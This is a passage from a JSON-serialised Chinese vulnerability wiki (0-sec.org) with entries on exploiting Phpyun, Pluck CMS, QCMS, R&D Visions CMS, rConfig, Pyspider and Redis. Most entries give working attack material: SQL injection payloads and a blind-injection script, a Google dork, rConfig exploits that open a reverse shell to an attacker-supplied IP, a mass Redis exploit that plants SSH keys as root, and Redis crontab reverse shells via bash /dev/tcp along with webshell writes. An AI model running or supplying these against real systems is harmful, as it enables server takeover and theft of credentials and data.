\"r\",encoding='utf-8') outfile = open(bdlj + \"\\datah.txt\", \"w\",encoding='utf-8') for line in infile: outfile.write(line.replace('156as1f56safasfasfa', zz)) infile.close() outfile.close() datas = open(bdlj+\"\\datah.txt\",'r') datass = datas.read() gs = requests.post(ur + '/base/appfile.php',data=datass,headers={'Content-Type':headerss}) gs.encoding = 'utf-8' print (gs.text) if {gs.text == \"OK\"}: print (\"Getshell成功! Shell:\" + ur + \"/effect/source/bg/mstir.php\") else: print (\"Getsehll失败!\") 整包下载地址:https://github.com/ianxtianxt/Phpweb-Getshell-py 使用请下载整包,否则会缺少协议头和data数据! 使用教程: 参考链接 https://m4tir.github.io/Phpweb-Reception-Getshell 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-14 14:22:59 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/PhpYun/Phpyun v3.1 xml 注入漏洞.html":{"url":"0day/PhpYun/Phpyun v3.1 xml 注入漏洞.html","title":"Phpyun v3.1 xml 注入漏洞","keywords":"","body":"Phpyun v3.1 xml 注入漏洞 一、漏洞简介 函数过滤不严谨，用户POST过去的内容没有进行任何过滤，导致攻击者可以利用XML实体进行注入，从而获取数据库敏感信息 二、漏洞影响 3.1 build14061 三、复现过程 漏洞分析 本次漏洞文件位于 weixin/model/index.class.php ，代码如下： private function responseMsg() { $postStr = $GLOBALS[\"HTTP_RAW_POST_DATA\"]; if (!empty($postStr)){ $postObj = simplexml_load_string($postStr, 'SimpleXMLElement', LIBXML_NOCDATA); $fromUsername = $postObj->FromUserName; $toUsername = $postObj->ToUserName; $keyword = trim($postObj->Content); $time = time(); $textTpl = \" %s 0 \"; if(!empty( $keyword )) { $msgType = \"text\"; $contentStr = \"Welcome to wechat world!\"; $resultStr = sprintf($textTpl, $fromUsername, $toUsername, $time, $msgType, $contentStr); echo $resultStr; }else{ echo \"Input something...\"; } }else { echo \"\"; exit; } } 这里将$postStr = $GLOBALS[\"HTTP_RAW_POST_DATA\"]，通过 simplexml_load_string解析后的内容，将其直接带入了$textTpl。 然而$postStr = $GLOBALS[\"HTTP_RAW_POST_DATA\"] ，直接获取了POST过来的XML内容，没有经过任何处理，并在最后将其输出。 if($MsgType=='event') { $MsgEvent = $postObj->Event; if ($MsgEvent=='subscribe') { $centerStr = \"config['sy_webname']).\"！/n 1：您可以直接回复关键字如【销售】、【南京 销售】、【南京 销售 XX公司】查找您想要的职位/n绑定您的账户体验更多精彩功能/n感谢您的关注！]]>\"; $this->MsgType = 'text'; }elseif ($MsgEvent=='CLICK') { $EventKey = $postObj->EventKey; if($EventKey=='我的帐号'){ $centerStr = $this->bindUser($fromUsername); }elseif($EventKey=='我的消息') { $centerStr = $this->myMsg($fromUsername); }elseif($EventKey=='面试邀请') { $centerStr = $this->Audition($fromUsername); }elseif($EventKey=='简历查看') { $centerStr = $this->lookResume($fromUsername); }elseif($EventKey=='刷新简历') { $centerStr = $this->refResume($fromUsername); 从上述代码可以看出来，当满足那上面的条件后都会进入不同的相应的函数，但是都会进入一个名为isBind函数。 接下来追踪isBind函数： private function isBind($wxid='') { if($wxid) { $User = $this->obj->DB_select_once(\"member\",\"`wxid`='\".$wxid.\"'\",\"`uid`,`username`\"); } if($User['uid']>0) { $User['bindtype'] = '1'; $User['cenetrTpl'] = \"config['sy_webname']).\"帐号：\".$User['username'].\"已成功绑定！ /n/n/n 您也可以config['sy_weburl'].\"/wap/index.php?m=login&wxid=\".$wxid.\"/\">点击这里进行解绑或绑定其他帐号]]>\"; }else{ $Token = $this->getToken(); $Url = 'https://api.weixin.qq.com/cgi-bin/user/info?access_token='.$Token.'&openid='.$wxid.'&lang=zh_CN'; $CurlReturn = $this->CurlPost($Url); $UserInfo = json_decode($CurlReturn); $wxid = $wxid; $wxname = $UserInfo->nickname; $this->config['token_time'] = time(); $User['cenetrTpl'] = '点击这里进行绑定!]]>'; } return $User; } 可以看到，从始至终wxid变量始终没有经过任何过滤，在第一行的$wxid就是我们传进来的FromUserName的值，可以直接进入SQL语句，进行任意注入。 因此我们可以针对其构造Payload，内容如下： 一般来说，我们只需要将Payload以POST形式的数据发出去，就可以成功的获取数据库敏感信息，但是服务器如果有WAF，提交的恶意数据必然会被拦截，因此，我们需要修改HTTP头，伪装成XML就可以不受到WAF的拦截： Content-type:text/xml;charset=utf-8 漏洞复现 我们首先打开目标站点，点击网页左侧注册按钮，首先注册一个账号： 这个时候已经是登录状态，我们按F9 调出 Hack Bar 的界面，点击Enable Post data ，将Payload写入输入框，如下图所示： payload文件: 注:payload文件内容需手动输入相应位置 1111 1111' and 1=2 union select 1,(select concat(username,password) from phpyun_member limit 0,1)# 1402550611 event CLICK 我的账号 0 接下来还需要修改HTTP头，伪装成XML，点击浏览器上方工具栏，打开Tamper Data ，点击启动。 现在前提工作已经做好，接下来重新访问网站，Tamper Data 就会抓取到数据包，再对数据包进行更改，操作如图： 然后点击确定就可以将构造好的数据包发出去： 成功获取管理员账号密码。 参考链接 https://blog.csdn.net/whatiwhere/article/details/84862236 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-20 01:29:19 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/PhpYun/Phpyun系统重装漏洞.html":{"url":"0day/PhpYun/Phpyun系统重装漏洞.html","title":"Phpyun v4.2（部分） 4.3 4.5 系统重装漏洞","keywords":"","body":"Phpyun v4.2（部分） 4.3 4.5 系统重装漏洞 一、漏洞简介 二、漏洞影响 经测试该漏洞影响从4.3到 4.5 所有版本，4.2部分版本受影响，4.2最终版本不受影响。具体情况请自行测试。 三、复现过程 漏洞分析 看到install 文件夹里的index.php，这里分php5,php7两种情况进行调用安装。 以php5为例。 文件 根目录/install/php5/install.php 代码中： 先判断了是否存在lock文件，存在即退出安装。 其中S_ROOT这个常量是在前面index.php文件中定义的。 取得是当前文件的绝对路径。拼接起来，检测的lock文件位置应该是 根目录/install/data/phpyun.lock。 这里没什么问题。 按照正常安装走完，看到最后一步 创建lock文件，这里用的是相对路径。install.php是被index.php 用require的模式调用的。 取得路径应该是 根目录/install/，按照上图的路径创造的lock文件应该是放至于 根目录/data/phpyun.lock。 创建的lock文件路径是 根目录/data/phpyun.lock，检测的路径却是 根目录/install/data/phpyun.lock 那么一个重装的安全隐患就埋下了。 当用户安装完成之后，是可以被无限重装的，因为这个路径错误问题。 以本地phpyun4.3 已经安装完成系统为例，是可以被重装的。 最新版phpyun 4.5这里的代码和4.3是一样的。 phpyun 4.2 版本处理逻辑不一样，这个版本不受影响。 经测试phpyun 4.2某些版本依旧是受影响的。 版本测试 网上一些系统： 官方测试站，版本phpyun 4.2111： 某招聘网，版本phpyun 4.3 参考链接 https://www.cnblogs.com/r00tuser/p/8533517.html 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-20 01:17:06 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/PhpYun/Phpyun v5.0.1 后台getshell.html":{"url":"0day/PhpYun/Phpyun v5.0.1 后台getshell.html","title":"Phpyun v5.0.1 后台getshell","keywords":"","body":"Phpyun v5.0.1 后台getshell 一、漏洞简介 二、漏洞影响 Phpyun v5.0.1 三、复现过程 安装好本地环境,看了下系统功能,等等测试,最后查看前台index.php源码。 后台直接写入被过滤掉了。 又去翻了下后台功能,发下有个生成功能,并且没有后缀限制。 生存成功,但是发现()被大写,使用经典的include包含,随意找了一个模板下的info.txt文件,写入执行代码。 成功执行代码 代码分析： 对post的数据没有任何验证,直接代入 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-11 18:33:00 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Pluck cms/1.html":{"url":"0day/Pluck cms/1.html","title":"Pluck CMS后台另两处任意代码执行","keywords":"","body":"Pluck CMS后台另两处任意代码执行 一、漏洞简介 二、漏洞影响 三、复现过程 第一处：过滤不严导致单引号逃逸 在function.php里面blog_save_post()函数 function blog_save_post($title, $category, $content, $current_seoname = null, $force_time = null) { //Check if 'posts' directory exists, if not; create it. if (!is_dir(BLOG_POSTS_DIR)) { mkdir(BLOG_POSTS_DIR); chmod(BLOG_POSTS_DIR, 0777); } //Create seo-filename $seoname = seo_url($title); //Sanitize variables. $title = sanitize($title, true); $content = sanitizePageContent($content, false); if (!empty($current_seoname)) { $current_filename = blog_get_post_filename($current_seoname); $parts = explode('.', $current_filename); $number = $parts[0]; //Get the post time. include BLOG_POSTS_DIR.'/'.$current_filename; if ($seoname != $current_seoname) { unlink(BLOG_POSTS_DIR.'/'.$current_filename); if (is_dir(BLOG_POSTS_DIR.'/'.$current_seoname)) rename(BLOG_POSTS_DIR.'/'.$current_seoname, BLOG_POSTS_DIR.'/'.$seoname); } } else { $files = read_dir_contents(BLOG_POSTS_DIR, 'files'); //Find the number. if ($files) { $number = count($files); $number++; } else $number = 1; if (empty($force_time)) $post_time = time(); else $post_time = $force_time; } //Save information. $data['post_title'] = $title; $data['post_category'] = $category; $data['post_content'] = $content; $data['post_time'] = $post_time; save_file(BLOG_POSTS_DIR.'/'.$number.'.'.$seoname.'.php', $data); //Return seoname under which post has been saved (to allow for redirect). return $seoname; } 其中 $data['post_title'] = $title; $data['post_category'] = $category; $data['post_content'] = $content; $data['post_time'] = $post_time; $title $content 均被过滤，$post_time不可控，$category可控 所以只要把$cont2变成我们的payload即可 第二处：安装模版+文件包含导致任意命令执行 很多CMS都会在安装模版的时候getshell，那么这里笔者也发现了类似的漏洞。 1、直接访问失败 首先准备一个shell.php里面是我们的phpinfo(); 然后打包成shell.zip，直接上传主题 发现确实上传并且解压成功 但是由于目录下有.htaccess文件，直接把php设置为不可解析，所以无法直接访问 2、文件包含突破 所以就想到需要找一个位置对其进行包含，来达到执行的目的。 首先看到admin.php中关于theme的部分 跟进 data/inc/theme.php，发现调用了get_themes()方法 跟进 functions.all.php，查看get_themes()方法 function get_themes() { $dirs = read_dir_contents('data/themes', 'dirs'); if ($dirs) { natcasesort($dirs); foreach ($dirs as $dir) { if (file_exists('data/themes/'.$dir.'/info.php')) { include_once ('data/themes/'.$dir.'/info.php'); $themes[] = array( 'title' => $themename, 'dir' => $dir ); } } return $themes; } else return false; } 发现会遍历data/themes/下所有主题目录，并且包含他的info.php文件 此时info.php可控，就导致了任意代码执行。 3、利用方法 首先准备一个info.php 然后打包压缩成shell.zip 上传安装主题，然后点击回到主题页，此时触发文件包含。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-04 00:41:04 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Pluck cms/2.html":{"url":"0day/Pluck cms/2.html","title":"Pluck CMS 4.7.10 后台 文件包含+文件上传导致getshell","keywords":"","body":"Pluck CMS 4.7.10 后台 文件包含+文件上传导致getshell 一、漏洞简介 二、漏洞影响 Pluck CMS Pluck CMS 三、复现过程 1、分析过程 目前最新版本为4.7.10，个人测试github上最旧的4.7.2版本仍然存在该漏洞，框架本身语言选择模块数据注入导致的文件包含漏洞，官方更新版本并没有对这部分代码进行修改，可以认为是全版本通用的。该漏洞是在复现\"我怎么这么帅\"在先知发表的《Pluck CMS 4.7.10远程代码执行漏洞分析》之余审计其他代码发现的，在此致谢。 v4.7.1分析 从入口文件admin.php查看: 查看language.php,满足指定的文件存在，并传入的cont1参数和原本设置的$langpref参数不等，进入save_language($cont1)。 调用save_file方法。 由于只有一个数据，直接182写入php文件。 至此，langpref的值变成可控值，这个值对应的文件，用于控制网站的语言选择，会自动被全局php文件包含。可以包含上传功能点上传的图种文件解析其中的一句话导致getshell。文件上传功能点使用白名单，但是没有进行重命名，所以路径可以简单猜解。 2、复现过程 文件上传一个可以写一句话木马的php图种。 上述参数保存于php文件： \\data\\settings\\langpref.php 由于该参数是网站语言控制的php文件，访问任意网页，包含langpref对应的文件。 访问生成的php一句话木马。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-04 00:41:14 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Pyspider/1.html":{"url":"0day/Pyspider/1.html","title":"pyspider未授权访问","keywords":"","body":"pyspider未授权访问 一、漏洞简介 pyspider未授权访问 二、影响范围 三、复现过程 https://github.com/ianxtianxt/Pyspider-webui-poc 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-01 04:05:18 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/QCMS/1.html":{"url":"0day/QCMS/1.html","title":"QCMS 3.0 留言板xss","keywords":"","body":"QCMS 3.0 留言板xss 一、漏洞简介 二、漏洞影响 QCMS 3.0 三、复现过程 按照如图所示构造payload 提交之后无需审核，直接先弹个窗。。 登录后台再弹一个。。 查看数据库，没有过滤直接插入 参考链接 https://xz.aliyun.com/t/7269 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-05 01:04:18 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/QCMS/2.html":{"url":"0day/QCMS/2.html","title":"QCMS 3.0 sql注入漏洞","keywords":"","body":"QCMS 3.0 sql注入漏洞 一、漏洞简介 二、漏洞影响 QCMS 3.0 三、复现过程 在后台下载管理处 构造payload http://www.0-sec.org/backend/down.html?title=1';select if(ascii(substr((select database()), 1, 1))-113, 1, sleep(5));%23 这里直接附上简单脚本 # !/usr/bin/python3 # -*- coding:utf-8 -*- # author: Forthrglory import requests def getCookie(): url = 'http://127.0.0.1/admin.php' data = { 'username':'admin', 'password':'admin' } session = requests.session() res = session.post(url, data) return requests.utils.dict_from_cookiejar(res.cookies) def getDatabase(url, arr, cookies): str = '' requests.session() for i in range(1, 11): for j in arr: data = url + '?title=1\\';select if(ascii(substr((select database()), %s, 1))-%s, 1, sleep(5));%%23' % (i, ord(j)) # print(data) res = requests.get(url=data, cookies=cookies) # print(res.elapsed.total_seconds()) if(res.elapsed.total_seconds() > 5): str += j print(str) break print('database=' + str) if __name__ == '__main__': url = 'http://127.0.0.1/backend/down.html' arr = [] for i in range(48, 123): arr.append(chr(i)) cookies = getCookie() print(cookies) getDatabase(url, arr, cookies) 参考链接 https://xz.aliyun.com/t/7269 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-05 01:04:14 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/QCMS/3.html":{"url":"0day/QCMS/3.html","title":"QCMS 3.0 任意文件上传","keywords":"","body":"QCMS 3.0 任意文件上传 一、漏洞简介 二、漏洞影响 QCMS 3.0 三、复现过程 漏洞产生点在系统设置上传logo处 构造一个test.php文件，内容为`，点击上传 可以看到，上传后给出了路径 访问文件，发现上传成功 需要注意的是，每次上传后会将内容的hash保存到数据库中，如果再次上传时会检查数据库内容是否有重复，有则拒绝上传，因此如果第一遍上传有误，需要对内容进行简单的修改才能上传。 参考链接 https://xz.aliyun.com/t/7269 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-05 01:04:10 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/QCMS/4.html":{"url":"0day/QCMS/4.html","title":"QCMS 3.0 任意文件读取","keywords":"","body":"QCMS 3.0 任意文件读取 一、漏洞简介 二、漏洞影响 QCMS 3.0 三、复现过程 用seay扫了一下后发现的漏洞 漏洞在后台模板代码预览处，构造payload例如 http://www.0-sec.org/backend/template/tempview/Li4vLi4vLi4vQ29udHJvbGxlci9hZG1pbi5waHA=.html 即可读取Controller文件下admin.php文件源码 跟源码对比下，确实是读到了 参考链接 https://xz.aliyun.com/t/7269 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-05 01:04:07 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/R&D Visions CMS/1.html":{"url":"0day/R&D Visions CMS/1.html","title":"R&D Visions CMS  SQL Injection","keywords":"","body":"R&D Visions CMS SQL Injection 一、漏洞简介 二、漏洞影响 三、复现过程 Google Dork: intext:\"Website by R&D Visions\" inurl:.php?id= intext:\"CMS System by R&D Visions\" Demo: https://www.0-sec.org/home.php?newid=53[SQLi] Injection: https://www.0-sec.org/home.php?newid=-53+Union+Select+1,Group_ConCat(user,0x3a,pass),3,4,5,6,7,8,9,10,11,12+From+admin_user_log--+ 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-24 13:48:29 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/rConfig/1.html":{"url":"0day/rConfig/1.html","title":"（CVE-2019-16662）rConfig远程命令执行","keywords":"","body":"（CVE-2019-16662）rConfig远程命令执行 一、漏洞简介 二、漏洞影响 三、复现过程 https://www.0-sec.org/install/lib/ajaxHandlers/ajaxServerSettingsChk.php?rootUname=`php -r '$sock=fsockopen(\"1.2.3.4\",1234);exec(\"/bin/sh -i &3 2>&3\");'` pyton脚本一 #!/usr/bin/python # Exploit Title: rConfig v3.9.2 unauthenticated Remote Code Execution # Date: 18/09/2019 # Exploit Author: Askar (@mohammadaskar2) # CVE : CVE-2019-16662 # Vendor Homepage: https://rconfig.com/ # Software link: https://rconfig.com/download # Version: v3.9.2 # Tested on: CentOS 7.7 / PHP 7.2.22 import requests import sys from urllib import quote from requests.packages.urllib3.exceptions import InsecureRequestWarning requests.packages.urllib3.disable_warnings(InsecureRequestWarning) if len(sys.argv) != 4: print \"[+] Usage : ./exploit.py target ip port\" exit() target = sys.argv[1] ip = sys.argv[2] port = sys.argv[3] payload = quote(''';php -r '$sock=fsockopen(\"{0}\",{1});exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'#'''.format(ip, port)) install_path = target + \"/install\" req = requests.get(install_path, verify=False) if req.status_code == 404: print \"[-] Installation directory not found!\" print \"[-] Exploitation failed !\" exit() elif req.status_code == 200: print \"[+] Installation directory found!\" url_to_send = target + \"/install/lib/ajaxHandlers/ajaxServerSettingsChk.php?rootUname=\" + payload print \"[+] Triggering the payload\" print \"[+] Check your listener !\" requests.get(url_to_send, verify=False) python脚本二 #!/usr/bin/python # Exploit Title: rConfig v3.9.2 Authenticated Remote Code Execution # Date: 18/09/2019 # Exploit Author: Askar (@mohammadaskar2) # CVE : CVE-2019-16663 # Vendor Homepage: https://rconfig.com/ # Software link: https://rconfig.com/download # Version: v3.9.2 # Tested on: CentOS 7.7 / PHP 7.2.22 import requests import sys from urllib import quote from requests.packages.urllib3.exceptions import InsecureRequestWarning requests.packages.urllib3.disable_warnings(InsecureRequestWarning) if len(sys.argv) != 6: print \"[+] Usage : ./exploit.py target username password ip port\" exit() target = sys.argv[1] username = sys.argv[2] password = sys.argv[3] ip = sys.argv[4] port = sys.argv[5] request = requests.session() login_info = { \"user\": username, \"pass\": password, \"sublogin\": 1 } login_request = request.post( target+\"/lib/crud/userprocess.php\", login_info, verify=False, allow_redirects=True ) dashboard_request = request.get(target+\"/dashboard.php\", allow_redirects=False) if dashboard_request.status_code == 200: print \"[+] LoggedIn successfully\" payload = '''\"\"&amp;&amp;php -r '$sock=fsockopen(\"{0}\",{1});exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'#'''.format(ip, port) encoded_request = target+\"/lib/crud/search.crud.php?searchTerm=anything&amp;catCommand={0}\".format(quote(payload)) print \"[+] triggering the payload\" print \"[+] Check your listener !\" exploit_req = request.get(encoded_request) elif dashboard_request.status_code == 302: print \"[-] Wrong credentials !\" exit() 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-13 12:40:12 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Redis/1.html":{"url":"0day/Redis/1.html","title":"(python)Mongodb-Redis匿名扫描脚本","keywords":"","body":"(python)Mongodb-Redis匿名扫描脚本 一、漏洞简介 (python)Mongodb-Redis匿名扫描脚本 二、影响范围 三、复现过程 https://github.com/ianxtianxt/Mongodb-Redis-scan/ mongodb-redis匿名扫描脚本，支持mongodb和redis的匿名扫描，脚本是之前有需求写的，现在分享给大家学习和研究: 用法： 批量扫描：Mongodbscan.py -m 100 -u ip.txt url.txt IP段扫描：Mongodbscan.py -m 100 -g 192.168.1.1-192.168.1.254 url.txt python2环境 pip install redis 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-01 10:09:48 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Redis/2.html":{"url":"0day/Redis/2.html","title":"(python)redis未授权批量提权脚本","keywords":"","body":"(python)redis未授权批量提权脚本 一、漏洞简介 (python)redis未授权批量提权脚本 二、影响范围 三、复现过程 安装依赖 ☁ ~ sudo easy_install redis 使用 ☁ redis python hackredis.py usage: hackredis.py [-h] [-l IPLIST] [-p PORT] [-r ID_RSAFILE] [-sp SSH_PORT] For Example: ----------------------------------------------------------------------------- python hackredis.py -l ip.txt -p 6379 -r foo.txt -sp 22 optional arguments: -h, --help show this help message and exit -l IPLIST the hosts of target -p PORT the redis default port -r ID_RSAFILE the ssh id_rsa file you generate -sp SSH_PORT the ssh port 首先需要ssh密钥: ☁ ~ ssh-keygen -t rsa ☁ ~ cp ~/.ssh/id_rsa.pub /tmp/foo.txt 之后将ip列表填入ip.txt，然后就可以跑了。 成功的将会输出到success.txt,执行成功但是ssh连接失败的会存储在unconnect.txt，操作失败的会存储在fail.txt。 #!/usr/bin/python #coding:utf-8 ############################################################# ## @file hackredis.py ## ## @date 2015-12-11 ## ## @author evi1cg ## ############################################################# import redis import argparse import textwrap import sys import pexpect def getargs(): parser = argparse.ArgumentParser(prog='hackredis.py', formatter_class=argparse.RawTextHelpFormatter, description=textwrap.dedent('''\\ For Example: ----------------------------------------------------------------------------- python hackredis.py -l ip.txt -p 6379 -r foo.txt -sp 22''')) parser.add_argument('-l', dest='iplist', type=str, help='the hosts of target') parser.add_argument('-p', dest='port', default=6379, type=int, help='the redis default port') parser.add_argument('-r', dest='id_rsafile', type=str, help='the ssh id_rsa file you generate') parser.add_argument('-sp', dest='ssh_port', type=int,default=22, help='the ssh port') if(len(sys.argv[1:]) / 2 != 4): sys.argv.append('-h') return parser.parse_args() def hackredis(host,port): ck = 0 try: print \"[*] Attacking ip:%s\"%host r =redis.StrictRedis(host=host,port=port,db=0,socket_timeout=2) r.flushall r.set('crackit',foo) r.config_set('dir','/root/.ssh/') r.config_set('dbfilename','authorized_keys') r.save() ck =1 except: print \"\\033[1;31;40m[-]\\033[0m Something wrong with %s\"%host write(host,2) ck =0 if ck == 1: check(host) else: pass def check(host): print '\\033[1;33;40m[*]\\033[0m Check connecting... ' try: ssh = pexpect.spawn('ssh root@%s -p %d' %(host,ssh_port)) i = ssh.expect('[#\\$]',timeout=2) if i == 0: print \"\\033[1;34;40m[+]\\033[0m Success !\" write(host,1) else: pass except: print \"\\033[1;32;40m[-]\\033[0m Failed to connect !\" write(host,3) def write(host,suc): if suc == 1: filesname = 'success.txt' elif suc ==2: filesname = 'fail.txt' elif suc ==3: filesname = 'unconnect.txt' else: pass file_object = open(filesname,'a') file_object.write(host+' ') file_object.close() def main(): global foo,ssh_port paramsargs = getargs() try: hosts = open(paramsargs.iplist,\"r\") except(IOError): print \"Error: Check your hostfile path \" sys.exit(1) port = paramsargs.port ssh_port = paramsargs.ssh_port try: foo = ' '+open(paramsargs.id_rsafile,\"r\").readline()+' ' except(IOError): print \"Error: Check your wordlist path \" sys.exit(1) ips = [p.replace(' ','') for p in hosts] for ip in ips: hackredis(ip.strip(),port) if __name__ == \"__main__\": main() 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-10-31 13:28:56 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Redis/3.html":{"url":"0day/Redis/3.html","title":"redis未授权访问漏洞","keywords":"","body":"redis未授权访问漏洞 一、漏洞简介 redis未授权访问漏洞 二、影响范围 三、复现过程 1.环境安装 从官网wget到本地 wget http://download.redis.io/releases/redis-3.2.11.tar.gz tar xzf redis-3.2.11.tar.gz 将redis.conf copy到 /etc/下 启动时使用命令 redis-server /etc/redis.conf 测试时建议 vim /etc/redis.conf 去掉ip绑定，允许除本地外的主机远程登录redis服务 (1)bind 127.0.0.1前面加上##号注释掉 或者更改成 0.0.0.0 (2)protected-mode设为no 如图 2.攻击者常用命令 （1）info 查看信息 （2）flushall 删除所有数据库内容： （3）flushdb 刷新数据库 （4）看所有键：KEYS *，使用select num可以查看键值数据。 （5）set test \"who am i\" 设置变量 （6）config set dir dirpath 设置路径等配置 （7）config get dir/dbfilename 获取路径及数据配置信息 （8）save 保存 （9）get 变量，查看变量名称 3.msf下利用模块 auxiliary/scanner/redis/file_upload auxiliary/scanner/redis/redis_login auxiliary/scanner/redis/redis_server 4.nmap获取信息 命令：nmap -A -p 6379 --script redis-info ipaddress 5.连接Redis服务器 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-04 00:39:10 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Redis/4.html":{"url":"0day/Redis/4.html","title":"redis总结","keywords":"","body":"redis总结 一、漏洞简介 redis总结 二、影响范围 三、复现过程 攻击的几种方法 参考:http://www.cnblogs.com/xiaozi/p/7568272.htmlhttps://evi1cg.me/archives/hackredis.html (1).利用计划任务执行命令反弹shell 在redis以root权限运行时可以写crontab来执行命令反弹shell 先在自己的服务器上监听一个端口 nc -lvnp 7999 然后执行命令: root@kali:~## redis-cli -h 192.168.63.130 192.168.63.130:6379> set x \"\\n* * * * * bash -i >& /dev/tcp/192.168.63.128/7999 0>&1\\n\" 192.168.63.130:6379> config set dir /var/spool/cron/ 192.168.63.130:6379> config set dbfilename root 192.168.63.130:6379> save ps:此处使用bash反弹shell，也可使用其他方法 (2).写ssh-keygen公钥然后使用私钥登陆 在以下条件下，可以利用此方法 1、Redis服务使用ROOT账号启动 2、服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器。 首先在本地生成一对密钥： root@kali:~/.ssh## ssh-keygen -t rsa 然后redis执行命令： ssh-keygen -t rsa (echo -e \"\\n\\n\"; cat id_rsa.pub; echo -e \"\\n\\n\") > foo.txt cat foo.txt | redis-cli -h x.x.x.x -x set crackit redis-cli -h x.x.x.x > config set dir /root/.ssh/ > config get dir > config set dbfilename \"authorized_keys\" > save ssh -i id_rsa root@x.x.x.x 或者如下 192.168.63.130:6379> config set dir /root/.ssh/ 192.168.63.130:6379> config set dbfilename authorized_keys 192.168.63.130:6379> set x \"\\n\\n\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKfxu58CbSzYFgd4BOjUyNSpbgpkzBHrEwH2/XD7rvaLFUzBIsciw9QoMS2ZPCbjO0IZL50Rro1478kguUuvQrv/RE/eHYgoav/k6OeyFtNQE4LYy5lezmOFKviUGgWtUrra407cGLgeorsAykL+lLExfaaG/d4TwrIj1sRz4/GeiWG6BZ8uQND9G+Vqbx/+zi3tRAz2PWBb45UXATQPvglwaNpGXVpI0dxV3j+kiaFyqjHAv541b/ElEdiaSadPjuW6iNGCRaTLHsQNToDgu92oAE2MLaEmOWuQz1gi90o6W1WfZfzmS8OJHX/GJBXAMgEgJhXRy2eRhSpbxaIVgx root@kali\\n\\n\\n\" 192.168.63.130:6379> save (3).往web物理路径写webshell 当redis权限不高时，并且服务器开着web服务，在redis有web目录写权限时，可以尝试往web路径写webshell 192.168.63.130:6379> config set dir /var/www/html/ 192.168.63.130:6379> config set dbfilename shell.php 192.168.63.130:6379> set x \"\" 192.168.63.130:6379> save 即可将shell写入web目录(web目录根据实际情况 (4).写二进制文件，利用dns、icmp等协议上线（tcp协议不能出网） From:http://www.00theway.org/2017/03/27/redis_exp/ 写二进制文件跟前边有所不同，原因在于使用RDB方式备份redis数据库是默认情况下会对文件进行压缩，上传的二进制文件也会被压缩，而且文件前后存在脏数据，因此需要将默认压缩关闭，并且通过计划任务调用python清洗脏数据。 local function hex2bin(hexstr) local str = \"\" for i = 1, string.len(hexstr) - 1, 2 do local doublebytestr = string.sub(hexstr, i, i+1); local n = tonumber(doublebytestr, 16); if 0 == n then str = str .. '\\00' else str = str .. string.format(\"%c\", n) end end return str end local dir = redis.call('config','get','dir') redis.call('config','set','dir','/tmp/') local dbfilename = redis.call('config','get','dbfilename') redis.call('config','set','dbfilename','t') local rdbcompress = redis.call('config','get','rdbcompression') redis.call('config','set','rdbcompression','no') redis.call('flushall') local data = '1a2b3c4d5e6f1223344556677890aa' redis.call('set','data',hex2bin('0a7c7c7c'..data..'7c7c7c0a')) local rst = {} rst[1] = 'server default config' rst[2] = 